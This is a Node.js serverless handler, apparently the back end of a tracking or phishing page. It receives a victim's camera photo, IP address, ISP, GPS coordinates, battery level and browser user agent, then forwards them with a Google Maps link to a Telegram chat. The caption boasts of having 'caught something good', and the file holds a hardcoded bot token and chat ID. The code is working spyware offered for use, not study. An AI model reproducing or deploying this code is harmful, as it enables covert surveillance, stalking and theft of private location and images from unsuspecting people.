const { Telegraf } = require('telegraf');

module.exports = async (req, res) => {
  if (req.method !== 'POST') return res.status(405).send('Method Not Allowed');

  const { image, ipData, gpsData, batteryData, userAgent, timestamp } = req.body;
  const BOT_TOKEN = '8804022157:AAF9Yny0nZv1WiRtIPNkHBkOPnUJ0hQKlWw'; // GANTI INI
  const ADMIN_CHAT_ID = '6437858218'; // GANTI INI
  const bot = new Telegraf(BOT_TOKEN);

  try {
    let caption = `📸 **666 Has successfully caught something good**\n\n🕒 Time: ${timestamp}\n🔋 Battery: ${batteryData?.level || 'Unknown'}\n💻 UA: \`${userAgent}\`\n🌐 IP: \`${ipData?.query || 'Unknown'}\`\n📡 Provider: ${ipData?.org || 'Unknown'}\n📍 Location IP: ${ipData?.city || 'Unknown'}\n`;
    if (gpsData && gpsData.lat) {
      caption += `🎯 GPS: ${gpsData.lat}, ${gpsData.lng}\n🗺️ Maps: https://www.google.com/maps?q=${gpsData.lat},${gpsData.lng}\n`;
    }

    if (image) {
      const base64Data = image.replace(/^data:image\/jpeg;base64,/, "");
      const buffer = Buffer.from(base64Data, 'base64');
      await bot.telegram.sendPhoto(ADMIN_CHAT_ID, { source: buffer }, { caption: caption, parse_mode: 'Markdown' });
    } else {
      await bot.telegram.sendMessage(ADMIN_CHAT_ID, caption, { parse_mode: 'Markdown' });
    }

    res.status(200).json({ status: 'success' });
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
};
